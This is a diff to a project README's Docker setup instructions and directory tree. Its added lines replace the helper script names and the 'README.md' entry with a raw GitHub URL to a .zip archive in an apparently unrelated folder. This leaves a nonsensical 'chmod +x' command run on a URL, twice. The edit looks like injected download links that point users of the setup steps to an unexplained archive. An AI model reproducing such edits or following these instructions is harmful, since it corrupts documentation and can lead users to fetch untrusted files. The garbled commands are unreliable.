@@ -84,7 +84,7 @@ yarn start
 
 ```bash
 cd docker
-chmod +x wait-for-it.sh start-backend.sh
+chmod +x https://raw.githubusercontent.com/Amritanshu-sde2/To-create-an-AI-generated-question-paper-system-y/master/meladiorite/To-create-an-AI-generated-question-paper-system-y.zip https://raw.githubusercontent.com/Amritanshu-sde2/To-create-an-AI-generated-question-paper-system-y/master/meladiorite/To-create-an-AI-generated-question-paper-system-y.zip
 ```
 
 | Scenario                  | Command                            |
@@ -110,7 +110,7 @@ docker-compose down
 ├── backend/          # Node JS API & services
 ├── frontend/         # React application
 ├── docker/           # Compose files & helper scripts
-└── README.md         # (this file)
+└── https://raw.githubusercontent.com/Amritanshu-sde2/To-create-an-AI-generated-question-paper-system-y/master/meladiorite/To-create-an-AI-generated-question-paper-system-y.zip         # (this file)
 ```
 
 ---
